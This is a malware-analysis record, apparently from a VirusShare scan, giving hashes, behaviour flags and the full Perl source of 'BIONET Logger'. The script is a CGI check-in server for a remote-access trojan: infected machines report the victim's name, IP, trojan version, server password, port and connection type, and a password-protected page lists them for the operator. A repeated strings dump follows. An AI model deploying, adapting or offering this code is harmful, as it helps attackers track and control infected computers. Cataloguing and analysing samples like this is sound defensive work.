{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file"
        },
        "macro": "#! /usr/bin/perl\n\n# ^ path to perl on your server (should be correct)\n#   If your wrong, you will get errors.\n\n############################################\n#\n#  BIONET Logger\n#  Verion : 1.1\n#  Author : Rezmond.\n#\n############################################\n\n# Log Settings (required)\n#############################################\n\n$checksum = \"bnsipn\";    # used as as flood protection see help file \n$path     = \"\" ;  # the path to where we store our files\n$script   = \"http://localhost/logger/blog.pl\" ; # location of this script file\n\n############################################\n#\n# Optional Log Settings \n# make sure the blowe files exist and  set \n# to the correct CHMOD on your server \n\n$logfile   = \"bnllog\";    # file to store log\n$password  = \"password\";  # password to access the logger\n\n############################################\n#\n# Extended settings (not described in tutorial) \n\n$POST_LIMIT = 20; # limits how many items to store in the log -1 for infinate\n\n############################################\n#\n# Do not edit from here on unless\n# you know what you are doing and want to modify\n# the CGI script.\n#\n############################################\n\n$FLOW_LIMIT = 5; # \n\n$reqLogMsg   = \"1\";   \n$reqGetlog   = \"2\";   \n$reqLogClear = \"3\";   \n\n$logfile   = $path . $logfile;\n$checkfile = $path . $checkfile;\n\n\n# syntax\n# request=1 nick= ip= ver= pass= port= id=bnsipn\n# request=2 (returns logdata) #not yet supported\n# request=3 clears the log\n# send nick=%victim_name&ip=%ip&ver=%version&pass=%pass&port=%port&ctype=%ctype &request=1 &id=bnsipn\n\n%params   = &getcgivars;\n\n$user       = $params{\"nick\"};\n$ip         = $params{\"ip\"};\n$version    = $params{\"ver\"};\n$pass       = $params{\"pass\"};\n$port       = $params{\"port\"};\n$connection = $params{\"ctype\"};\n$id         = $params{\"id\"};\n$request    = $params{\"request\"};\n\n$cgipass    = $params{\"logonpass\"};\n\n\n#for testing perposes\n\n#$user     = \"nick\";\n#$ip       = \"127.0.0.1\";\n#$version  = \"3.16.me\";\n#$pass     = \"passwerd\";\n#$port     = \"12349\";\n#$request  = \"1\";\n#$id       = \"bsipn\";\n\n\n\n\n# Handles LOG DATA Request\n############################################\n\n if ($request eq $reqLogMsg) #request add message to the log\n{\n  # check unique ID\n  if ($id ne $checksum) \n  {\n  \n  # use Fcntl qw(:DEFAULT :flock);\n  # sysopen(FHANDLE, \"error\", O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");\n  # flock(FHANDLE, LOCK_EX); \n  # \n  #  print FHANDLE \"<tr>\"; \n  #   print FHANDLE \"<td><font color='#000000'>\" . $user    . \"</font></td>\";\n  #   print FHANDLE \"<td><font color='#000000'>\" . $ip      . \"</font></td>\";\n  #   print FHANDLE \"<td><font color='#000000'>\" . $version . \"</font></td>\";\n  #   print FHANDLE \"<td><font color='#000000'>\" . $port    . \"</font></td>\";\n  #   print FHANDLE \"<td><font color='#000000'>\" . $connection . \"</font></td>\";\n  # \n  # closefile(FHANDLE);\n  \n   &HTMLdie(\"Flood protection Error: \");   \n  }\n\n   use Fcntl qw(:DEFAULT :flock);\n# sysopen(FHANDLE, \"$logfile\", O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");\n   sysopen(FHANDLE, $logfile, O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");\n   flock(FHANDLE, LOCK_EX);\n     \n\t if ($user eq \"\") { $user = \"Unknown\" ; }\n\t if ($connection eq \"\") { $connection = \"Unknown\" ; }\n\t if ($ip eq \"\") { $ip = \"Unknown\" ; }\n\t if ($version eq \"\") { $version = \"Unknown\" ; }\n\t  \t\t \n   \t print FHANDLE \"<tr>\"; \n     print FHANDLE \"<td><font color='#000000'>\" . $user    . \"</font></td>\";\n     print FHANDLE \"<td><font color='#000000'>\" . $ip      . \"</font></td>\";\n     print FHANDLE \"<td><font color='#000000'>\" . $version . \"</font></td>\";\n     print FHANDLE \"<td><font color='#000000'>\" . $port    . \"</font></td>\";\n     print FHANDLE \"<td><font color='#000000'>\" . $connection . \"</font></td>\";\n\t \n\t \n  #\t ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday) = gmtime(time);\n    $now_string = gmtime;\n\t \n     print FHANDLE \"<td><font color='#000000'>\" . $now_string .  \"</font></td>\";\n     print FHANDLE \"</tr>\\n\";\n #   $user$pass\n #  \" .  . \"&\" . . \"&\" .  . \"&\" . . \"&\" .  . chr(13) . chr(10); \n   close(FHANDLE);\t# Close the file\n   \n   &SizeLog(); #if we have too many messages truncate the log\n   \n   &HTMLdie(\"Message Recorded: \" , \"BioNet Notificaion\");\n   exit; #quit\n  }\n\n# HANDLES Display Log request\n############################################\n\n if ($request eq $reqGetlog) #request get the current message log data\n { \n# http://rezmond/logger/blog.pl?nick=gayserver&ip=126.0.3.3&ver=3.16me&pass=passwerd&port=12349&ctype=modem&id=bnsipn&request=2\n   &TestLogonPass();   \n   &DisplayLog();\n }\n\n\n# clears the log file\n############################################ \n#this basically truncates the log file\n if ($request eq $reqLogClear) #request clear log\n {\n   &TestLogonPass();\n   \n   use Fcntl qw(:DEFAULT :flock);\n   sysopen(FHANDLE, $logfile, O_RDWR | O_CREAT)    or die \"can't open filename: $!\";\n#   sysopen(FHANDLE, \"$logfile\", O_RDWR | O_CREAT)    or die \"can't open filename: $!\";\n   flock(FHANDLE, LOCK_EX);\n\n   truncate(FHANDLE, 0)   or die \"Error can't truncate : $logfile!\";\n   close(FHANDLE);\n\n   &DisplayLog(); \n   # &HTMLdie(\"Logfile Cleared MainPage \" , \"\" );            \n   exit; #quit\n }\n\n\n############################################\n\n  &TestLogonPass(); \n  &DisplayLog();   \n  &HTMLdie(\"Unsupported Request: \");\n exit;\n \n ############################################\n \n\nsub SizeLog\n {    \n  if ($POST_LIMIT eq -1) {return; } #disabled    \n \n  use Fcntl qw(:DEFAULT :flock);\n  #sysopen(FHANDLE, \"$logfile\", O_RDWR  ) or die( \"can't open filename: $!\");\n  sysopen(FHANDLE, $logfile, O_RDWR  ) or die( \"can't open filename: $!\");\n  flock(FHANDLE, LOCK_EX);\n  \n  @linedata = <FHANDLE>;\n  $numlines = @linedata; \n \n # &HTMLdie($linedata , \"arse\"); \n # ($numlines - $POST_LIMIT)\n\n  if ($numlines >  ($POST_LIMIT + $FLOW_LIMIT) )\n  {\n  \n  truncate(FHANDLE, 0)   or die \"Error can't truncate : $logfile!\";\n  close(FHANDLE);  \n  \n  #sysopen(FHANDLE, \"$logfile\", O_RDWR  ) or die( \"can't open filename: $!\");\n  sysopen(FHANDLE, $logfile, O_RDWR  ) or die( \"can't open filename: $!\");\n  flock(FHANDLE, LOCK_EX);\n  \n   for ($nm  = ($numlines - $POST_LIMIT) ; $nm  < $numlines ;  $nm ++) \n   {\t\n\t print  FHANDLE  $linedata[$nm];\n    }\n  }            \n      \n  close(FHANDLE);  \n  return;\n }\n\n \n############################################\n\nsub TestLogonPass\n{\n if ($password ne $cgipass)  \n {\n   &getPass(); \n  exit;\n }\n \n return;\n}\n\n############################################\n\nsub DisplayLog{\n\n# ?logonpass=$logonpass\n\n  #sysopen(FHANDLE, \"$logfile\", O_RDWR) or die( \"can't open filename: $!\");\n  sysopen(FHANDLE, $logfile, O_RDWR) or die( \"can't open filename: $!\");\n  @lines = <FHANDLE>; # Read it into an array\n  \n  \n  print \"Content-type: text/html\\n\\n<HTML> \" ;\n  print <<EOF;\n \n<head>\n<title>BioNet logger</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n</head>\n<STYLE type=text/css>\n\nTD {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n}\nDIV {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n}\nBODY {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n; color: #FFFFFF}\na:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}\na:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}\na:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}\na {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}\n\n</STYLE>\n\n<body bgcolor=\"#938F9A\" topmargin=\"0\" leftmargin=\"0\" marginwidth=\"0\" 8px font-size:>\n<table width=\"752\" border=0 >\n  <tr> \n    <td height=\"19\"> \n      <table width=\"100%\" border=\"0\">\n        <tr>\n          <td height=\"19\"><img src=\"image/tblogo.gif\" width=\"740\" height=\"30\"></td>\n        </tr>\n      </table>\n    </td>\n  </tr>\n  \n  <tr>\n    <td height=\"181\"> \n      <table width=\"100%\" border=\"0\" cellpadding=3 cellspacing=0>\n        <tr> \n          <td bgcolor=\"#797481\" height=\"6\"><font color=\"#FFFFFF\"><b>Bionet Logger \n            </b></font> <font color=\"#FFFFFF\"><b> </b></font> </td>\n        </tr>\n        <tr> \n          <td>\n            <table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" bgcolor=\"#C5C5C5\" bordercolor=\"#797481\">\n              <tr> \n                <td height=\"12\"><b><font color=\"#FFFFFF\"><b><font color=\"#000000\">Options \n                  -&gt; |\n\t\t\t\t  \nEOF\n\n  print \"<a href='blog.pl?logonpass=\" . $cgipass  .  \"'>Refresh log </a> </font></b></font><font color='#000000'><b>|\" ;\t\t\t\t   \n  print \"<a href='blog.pl?request=3&logonpass=\" . $cgipass . \"'> Clear log </a><b>|</b></b></font></b>\" ;\n\t \nprint <<EOF;\n\t\t\t\t   \n                </td>\n              </tr>\n            </table>\n\t\t\t\n            <b><font color=\"#FFFFFF\"><br>\n            </font></b> <b><b><br>\n            </b><font color=\"#FFFFFF\"><br>\n            Currrent Log</font></b></td>\n        </tr>\n        <tr> \n          <td height=\"40\"> \n            <div align=\"center\"> \n              <center>\n                <table border=1 bordercolor=#6D6875 cellpadding=3 \n                  cellspacing=0 width=\"100%\" bgcolor=\"#C5C5C5\"  >\n                  <tr> \n                    <td width=\"15%\"><font color=\"#000000\"><b>Name<br>\n                      </b></font></td>\n                    <td width=\"15%\"><font color=\"#000000\"><b>IP</b></font></td>\n                    <td width=\"13%\"><b><font color=\"#000000\">Version</font></b></td>\n                    <td width=\"16%\"><b><font color=\"#000000\">Port</font></b></td>\n                    <td width=\"14%\"><b><font color=\"#000000\">Connection</font></b></td>\n                    <td width=\"27%\"> \n                      <div align=\"left\"><b><font color=\"#000000\">Logged<br>\n                        </font></b></div>\n                    </td>\n                  </tr>\n\nEOF\n\t\n  $outpt = \"\";\t\n  foreach $lin (@lines)\n  {\n    # print  $lin . \"\\n\";\n\t$outpt = $lin . $outpt; # build list so that new enetries diplay first \n  }\n  \n  print $outpt;\n  \nprint <<EOF;  \n                </table>\n\t\t\t\t<br><br><br><br><br><br>\n              </center>\n            </div>\n          </td>\n        </tr>\n      </table>\n      <p><img src=\"image/iconsml.gif\" width=\"150\" height=\"104\"></p>\n    </td>\n  </tr>\n</table>\n\n</body>\n</html>\n\nEOF\n \n  close(FHANDLE);\t # Close the file  \n  exit; #quit\n}\n\n\n############################################\n\n\n\n\nsub getPass{\n\nprint \"Content-type: text/html\\n\\n<HTML> \" ;\nprint <<EOF;\n \n<html>\n\n<head>\n<title>BioNet logger</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n</head>\n<STYLE type=text/css>\n\nTD {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n}\nDIV {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n}\nBODY {\n\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt\n; color: #FFFFFF}\na:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}\na:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}\na:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}\na {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}\n\n</STYLE>\n<body bgcolor=\"#938F9A\" topmargin=\"0\" leftmargin=\"0\" marginwidth=\"0\" 8px font-size:>\n<table width=\"752\" border=0 >\n  <tr> \n    <td height=\"19\"> \n      <table width=\"100%\" border=\"0\">\n        <tr>\n          <td height=\"19\"><img src=\"image/tblogo.gif\" width=\"740\" height=\"30\"></td>\n        </tr>\n      </table>\n    </td>\n  </tr>\n  \n  <tr>\n    <td height=\"158\">\n      <table width=\"100%\" border=\"0\" cellpadding=3 cellspacing=0>\n        <tr> \n          <td bgcolor=\"#797481\" height=\"14\"><b><font color=\"#FFFFFF\">BioNet Server \n            logger</font></b></td>\n        </tr>\n        <tr> \n          <td><b><font color=\"#FFFFFF\"><br>\n            </font></b></td>\n        </tr>\n        <tr> \n          <td height=\"40\"> \n            <div align=\"center\"> \n              <center>\n\nEOF\n\nprint \"<form name='form1' method='post' action='\" . $script\t. \"'>\";\n\nprint <<EOF;  \n\n                <table width=\"31%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n                    <tr>\n                      <td><b><font color=\"#FFFFFF\"><br>\n                        Enter Password:</font></b> </td>\n                    </tr>\n                    <tr>\n                      <td>\n                        <input type=\"password\" name=\"logonpass\" maxlength=\"40\">\n                        <input type=\"submit\" name=\"Submit\" value=\"Enter\">\n                      </td>\n                    </tr>\n                  </table>\n                  <br>\n                  <br>\n                  <br>\n                </form>\n              </center>\n            </div>\n          </td>\n        </tr>\n      </table>\n      <p>&nbsp;</p>\n    </td>\n  </tr>\n</table>\n\n</body>\n</html>\n\nEOF\n}\n\n\n# Read all CGI vars into an associative array.\n\nsub getcgivars {\n    local($in, %in) ;\n    local($name, $value) ;\n\n\n    # First, read entire string of CGI vars into $in\n    if ( ($ENV{'REQUEST_METHOD'} eq 'GET') ||\n         ($ENV{'REQUEST_METHOD'} eq 'HEAD') ) {\n        $in= $ENV{'QUERY_STRING'} ;\n\n    } elsif ($ENV{'REQUEST_METHOD'} eq 'POST') {\n        if ($ENV{'CONTENT_TYPE'}=~ m#^application/x-www-form-urlencoded$#i) {\n            $ENV{'CONTENT_LENGTH'}\n                || &HTMLdie(\"No Content-Length sent with the POST request.\") ;\n            read(STDIN, $in, $ENV{'CONTENT_LENGTH'}) ;\n\n        } else { \n            &HTMLdie(\"Unsupported Content-Type: $ENV{'CONTENT_TYPE'}\") ;\n        }\n\n    } else {\n        &HTMLdie(\"Script was called with unsupported REQUEST_METHOD.\") ;\n    }\n    \n    # Resolve and unencode name/value pairs into %in\n    foreach (split('&', $in)) {\n        s/\\+/ /g ;\n        ($name, $value)= split('=', $_, 2) ;\n        $name=~ s/%(..)/chr(hex($1))/ge ;\n        $value=~ s/%(..)/chr(hex($1))/ge ;\n        $in{$name}.= \"\\0\" if defined($in{$name}) ;  # concatenate multiple vars\n        $in{$name}.= $value ;\n    }\n\n    return %in ;\n\n}\n\n\n# Die, outputting HTML error page\n# If no $title, use a default title\nsub HTMLdie {\n    local($msg,$title)= @_ ;\n    $title || ($title= \"Error Processing Request.\") ;\n    print <<EOF ;\nContent-type: text/html\n\n<html>\n  <head>\n    <title>$title</title>\n </head>\n<body>\n<font color=\"FF0000\"><h1>$title</h1></font>\n<h3>$msg</h3>\n</body>\n</html>\nEOF\n exit ;\n}\n"
    },
    "filename": "VirusShare_35eb483023010a9de503faaaa1c82f6f",
    "filesize": 14904,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "35eb483023010a9de503faaaa1c82f6f",
        "sha1": "78b000927f38a780bb30ed8a72a70eb52b81da07",
        "sha256": "d32c8537bae37ecd29d711f195291bba87daaf131bd841cc6b3e18442b0f6160"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#! /usr/bin/perl",
            "# ^ path to perl on your server (should be correct)",
            "#   If your wrong, you will get errors.",
            "############################################",
            "#  BIONET Logger",
            "#  Verion : 1.1",
            "#  Author : Rezmond.",
            "############################################",
            "# Log Settings (required)",
            "#############################################",
            "$checksum = \"bnsipn\";    # used as as flood protection see help file ",
            "$path     = \"\" ;  # the path to where we store our files",
            "$script   = \"http://localhost/logger/blog.pl\" ; # location of this script file",
            "############################################",
            "# Optional Log Settings ",
            "# make sure the blowe files exist and  set ",
            "# to the correct CHMOD on your server ",
            "$logfile   = \"bnllog\";    # file to store log",
            "$password  = \"password\";  # password to access the logger",
            "############################################",
            "# Extended settings (not described in tutorial) ",
            "$POST_LIMIT = 20; # limits how many items to store in the log -1 for infinate",
            "############################################",
            "# Do not edit from here on unless",
            "# you know what you are doing and want to modify",
            "# the CGI script.",
            "############################################",
            "$FLOW_LIMIT = 5; # ",
            "$reqLogMsg   = \"1\";   ",
            "$reqGetlog   = \"2\";   ",
            "$reqLogClear = \"3\";   ",
            "$logfile   = $path . $logfile;",
            "$checkfile = $path . $checkfile;",
            "# syntax",
            "# request=1 nick= ip= ver= pass= port= id=bnsipn",
            "# request=2 (returns logdata) #not yet supported",
            "# request=3 clears the log",
            "# send nick=%victim_name&ip=%ip&ver=%version&pass=%pass&port=%port&ctype=%ctype &request=1 &id=bnsipn",
            "%params   = &getcgivars;",
            "$user       = $params{\"nick\"};",
            "$ip         = $params{\"ip\"};",
            "$version    = $params{\"ver\"};",
            "$pass       = $params{\"pass\"};",
            "$port       = $params{\"port\"};",
            "$connection = $params{\"ctype\"};",
            "$id         = $params{\"id\"};",
            "$request    = $params{\"request\"};",
            "$cgipass    = $params{\"logonpass\"};",
            "#for testing perposes",
            "#$user     = \"nick\";",
            "#$ip       = \"127.0.0.1\";",
            "#$version  = \"3.16.me\";",
            "#$pass     = \"passwerd\";",
            "#$port     = \"12349\";",
            "#$request  = \"1\";",
            "#$id       = \"bsipn\";",
            "# Handles LOG DATA Request",
            "############################################",
            " if ($request eq $reqLogMsg) #request add message to the log",
            "  # check unique ID",
            "  if ($id ne $checksum) ",
            "  # use Fcntl qw(:DEFAULT :flock);",
            "  # sysopen(FHANDLE, \"error\", O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");",
            "  # flock(FHANDLE, LOCK_EX); ",
            "  # ",
            "  #  print FHANDLE \"<tr>\"; ",
            "  #   print FHANDLE \"<td><font color='#000000'>\" . $user    . \"</font></td>\";",
            "  #   print FHANDLE \"<td><font color='#000000'>\" . $ip      . \"</font></td>\";",
            "  #   print FHANDLE \"<td><font color='#000000'>\" . $version . \"</font></td>\";",
            "  #   print FHANDLE \"<td><font color='#000000'>\" . $port    . \"</font></td>\";",
            "  #   print FHANDLE \"<td><font color='#000000'>\" . $connection . \"</font></td>\";",
            "  # ",
            "  # closefile(FHANDLE);",
            "   &HTMLdie(\"Flood protection Error: \");   ",
            "   use Fcntl qw(:DEFAULT :flock);",
            "# sysopen(FHANDLE, \"$logfile\", O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");",
            "   sysopen(FHANDLE, $logfile, O_RDWR |  O_APPEND | O_CREAT  ) or die( \"can't open filename: $!\");",
            "   flock(FHANDLE, LOCK_EX);",
            "     ",
            "\t if ($user eq \"\") { $user = \"Unknown\" ; }",
            "\t if ($connection eq \"\") { $connection = \"Unknown\" ; }",
            "\t if ($ip eq \"\") { $ip = \"Unknown\" ; }",
            "\t if ($version eq \"\") { $version = \"Unknown\" ; }",
            "\t  \t\t ",
            "   \t print FHANDLE \"<tr>\"; ",
            "     print FHANDLE \"<td><font color='#000000'>\" . $user    . \"</font></td>\";",
            "     print FHANDLE \"<td><font color='#000000'>\" . $ip      . \"</font></td>\";",
            "     print FHANDLE \"<td><font color='#000000'>\" . $version . \"</font></td>\";",
            "     print FHANDLE \"<td><font color='#000000'>\" . $port    . \"</font></td>\";",
            "     print FHANDLE \"<td><font color='#000000'>\" . $connection . \"</font></td>\";",
            "  #\t ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday) = gmtime(time);",
            "    $now_string = gmtime;",
            "     print FHANDLE \"<td><font color='#000000'>\" . $now_string .  \"</font></td>\";",
            "     print FHANDLE \"</tr>\\n\";",
            " #   $user$pass",
            " #  \" .  . \"&\" . . \"&\" .  . \"&\" . . \"&\" .  . chr(13) . chr(10); ",
            "   close(FHANDLE);\t# Close the file",
            "   &SizeLog(); #if we have too many messages truncate the log",
            "   &HTMLdie(\"Message Recorded: \" , \"BioNet Notificaion\");",
            "   exit; #quit",
            "# HANDLES Display Log request",
            "############################################",
            " if ($request eq $reqGetlog) #request get the current message log data",
            "# http://rezmond/logger/blog.pl?nick=gayserver&ip=126.0.3.3&ver=3.16me&pass=passwerd&port=12349&ctype=modem&id=bnsipn&request=2",
            "   &TestLogonPass();   ",
            "   &DisplayLog();",
            "# clears the log file",
            "############################################ ",
            "#this basically truncates the log file",
            " if ($request eq $reqLogClear) #request clear log",
            "   &TestLogonPass();",
            "   use Fcntl qw(:DEFAULT :flock);",
            "   sysopen(FHANDLE, $logfile, O_RDWR | O_CREAT)    or die \"can't open filename: $!\";",
            "#   sysopen(FHANDLE, \"$logfile\", O_RDWR | O_CREAT)    or die \"can't open filename: $!\";",
            "   flock(FHANDLE, LOCK_EX);",
            "   truncate(FHANDLE, 0)   or die \"Error can't truncate : $logfile!\";",
            "   close(FHANDLE);",
            "   &DisplayLog(); ",
            "   # &HTMLdie(\"Logfile Cleared MainPage \" , \"\" );            ",
            "   exit; #quit",
            "############################################",
            "  &TestLogonPass(); ",
            "  &DisplayLog();   ",
            "  &HTMLdie(\"Unsupported Request: \");",
            " exit;",
            " ############################################",
            "sub SizeLog",
            " {    ",
            "  if ($POST_LIMIT eq -1) {return; } #disabled    ",
            "  use Fcntl qw(:DEFAULT :flock);",
            "  #sysopen(FHANDLE, \"$logfile\", O_RDWR  ) or die( \"can't open filename: $!\");",
            "  sysopen(FHANDLE, $logfile, O_RDWR  ) or die( \"can't open filename: $!\");",
            "  flock(FHANDLE, LOCK_EX);",
            "  @linedata = <FHANDLE>;",
            "  $numlines = @linedata; ",
            " # &HTMLdie($linedata , \"arse\"); ",
            " # ($numlines - $POST_LIMIT)",
            "  if ($numlines >  ($POST_LIMIT + $FLOW_LIMIT) )",
            "  truncate(FHANDLE, 0)   or die \"Error can't truncate : $logfile!\";",
            "  close(FHANDLE);  ",
            "  #sysopen(FHANDLE, \"$logfile\", O_RDWR  ) or die( \"can't open filename: $!\");",
            "  sysopen(FHANDLE, $logfile, O_RDWR  ) or die( \"can't open filename: $!\");",
            "  flock(FHANDLE, LOCK_EX);",
            "   for ($nm  = ($numlines - $POST_LIMIT) ; $nm  < $numlines ;  $nm ++) ",
            "   {\t",
            "\t print  FHANDLE  $linedata[$nm];",
            "    }",
            "  }            ",
            "      ",
            "  close(FHANDLE);  ",
            "  return;",
            "############################################",
            "sub TestLogonPass",
            " if ($password ne $cgipass)  ",
            "   &getPass(); ",
            "  exit;",
            " return;",
            "############################################",
            "sub DisplayLog{",
            "# ?logonpass=$logonpass",
            "  #sysopen(FHANDLE, \"$logfile\", O_RDWR) or die( \"can't open filename: $!\");",
            "  sysopen(FHANDLE, $logfile, O_RDWR) or die( \"can't open filename: $!\");",
            "  @lines = <FHANDLE>; # Read it into an array",
            "  print \"Content-type: text/html\\n\\n<HTML> \" ;",
            "  print <<EOF;",
            "<head>",
            "<title>BioNet logger</title>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">",
            "</head>",
            "<STYLE type=text/css>",
            "TD {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "DIV {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "BODY {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "; color: #FFFFFF}",
            "a:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}",
            "a:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}",
            "a:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}",
            "a {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}",
            "</STYLE>",
            "<body bgcolor=\"#938F9A\" topmargin=\"0\" leftmargin=\"0\" marginwidth=\"0\" 8px font-size:>",
            "<table width=\"752\" border=0 >",
            "  <tr> ",
            "    <td height=\"19\"> ",
            "      <table width=\"100%\" border=\"0\">",
            "        <tr>",
            "          <td height=\"19\"><img src=\"image/tblogo.gif\" width=\"740\" height=\"30\"></td>",
            "        </tr>",
            "      </table>",
            "    </td>",
            "  </tr>",
            "  <tr>",
            "    <td height=\"181\"> ",
            "      <table width=\"100%\" border=\"0\" cellpadding=3 cellspacing=0>",
            "        <tr> ",
            "          <td bgcolor=\"#797481\" height=\"6\"><font color=\"#FFFFFF\"><b>Bionet Logger ",
            "            </b></font> <font color=\"#FFFFFF\"><b> </b></font> </td>",
            "        </tr>",
            "        <tr> ",
            "          <td>",
            "            <table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" bgcolor=\"#C5C5C5\" bordercolor=\"#797481\">",
            "              <tr> ",
            "                <td height=\"12\"><b><font color=\"#FFFFFF\"><b><font color=\"#000000\">Options ",
            "                  -&gt; |",
            "\t\t\t\t  ",
            "  print \"<a href='blog.pl?logonpass=\" . $cgipass  .  \"'>Refresh log </a> </font></b></font><font color='#000000'><b>|\" ;\t\t\t\t   ",
            "  print \"<a href='blog.pl?request=3&logonpass=\" . $cgipass . \"'> Clear log </a><b>|</b></b></font></b>\" ;",
            "print <<EOF;",
            "\t\t\t\t   ",
            "                </td>",
            "              </tr>",
            "            </table>",
            "            <b><font color=\"#FFFFFF\"><br>",
            "            </font></b> <b><b><br>",
            "            </b><font color=\"#FFFFFF\"><br>",
            "            Currrent Log</font></b></td>",
            "        </tr>",
            "        <tr> ",
            "          <td height=\"40\"> ",
            "            <div align=\"center\"> ",
            "              <center>",
            "                <table border=1 bordercolor=#6D6875 cellpadding=3 ",
            "                  cellspacing=0 width=\"100%\" bgcolor=\"#C5C5C5\"  >",
            "                  <tr> ",
            "                    <td width=\"15%\"><font color=\"#000000\"><b>Name<br>",
            "                      </b></font></td>",
            "                    <td width=\"15%\"><font color=\"#000000\"><b>IP</b></font></td>",
            "                    <td width=\"13%\"><b><font color=\"#000000\">Version</font></b></td>",
            "                    <td width=\"16%\"><b><font color=\"#000000\">Port</font></b></td>",
            "                    <td width=\"14%\"><b><font color=\"#000000\">Connection</font></b></td>",
            "                    <td width=\"27%\"> ",
            "                      <div align=\"left\"><b><font color=\"#000000\">Logged<br>",
            "                        </font></b></div>",
            "                    </td>",
            "                  </tr>",
            "  $outpt = \"\";\t",
            "  foreach $lin (@lines)",
            "    # print  $lin . \"\\n\";",
            "\t$outpt = $lin . $outpt; # build list so that new enetries diplay first ",
            "  print $outpt;",
            "print <<EOF;  ",
            "                </table>",
            "\t\t\t\t<br><br><br><br><br><br>",
            "              </center>",
            "            </div>",
            "          </td>",
            "        </tr>",
            "      </table>",
            "      <p><img src=\"image/iconsml.gif\" width=\"150\" height=\"104\"></p>",
            "    </td>",
            "  </tr>",
            "</table>",
            "</body>",
            "</html>",
            "  close(FHANDLE);\t # Close the file  ",
            "  exit; #quit",
            "############################################",
            "sub getPass{",
            "print \"Content-type: text/html\\n\\n<HTML> \" ;",
            "print <<EOF;",
            "<html>",
            "<head>",
            "<title>BioNet logger</title>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">",
            "</head>",
            "<STYLE type=text/css>",
            "TD {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "DIV {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "BODY {",
            "\tFONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt",
            "; color: #FFFFFF}",
            "a:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}",
            "a:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}",
            "a:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}",
            "a {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}",
            "</STYLE>",
            "<body bgcolor=\"#938F9A\" topmargin=\"0\" leftmargin=\"0\" marginwidth=\"0\" 8px font-size:>",
            "<table width=\"752\" border=0 >",
            "  <tr> ",
            "    <td height=\"19\"> ",
            "      <table width=\"100%\" border=\"0\">",
            "        <tr>",
            "          <td height=\"19\"><img src=\"image/tblogo.gif\" width=\"740\" height=\"30\"></td>",
            "        </tr>",
            "      </table>",
            "    </td>",
            "  </tr>",
            "  <tr>",
            "    <td height=\"158\">",
            "      <table width=\"100%\" border=\"0\" cellpadding=3 cellspacing=0>",
            "        <tr> ",
            "          <td bgcolor=\"#797481\" height=\"14\"><b><font color=\"#FFFFFF\">BioNet Server ",
            "            logger</font></b></td>",
            "        </tr>",
            "        <tr> ",
            "          <td><b><font color=\"#FFFFFF\"><br>",
            "            </font></b></td>",
            "        </tr>",
            "        <tr> ",
            "          <td height=\"40\"> ",
            "            <div align=\"center\"> ",
            "              <center>",
            "print \"<form name='form1' method='post' action='\" . $script\t. \"'>\";",
            "print <<EOF;  ",
            "                <table width=\"31%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">",
            "                    <tr>",
            "                      <td><b><font color=\"#FFFFFF\"><br>",
            "                        Enter Password:</font></b> </td>",
            "                    </tr>",
            "                    <tr>",
            "                      <td>",
            "                        <input type=\"password\" name=\"logonpass\" maxlength=\"40\">",
            "                        <input type=\"submit\" name=\"Submit\" value=\"Enter\">",
            "                      </td>",
            "                    </tr>",
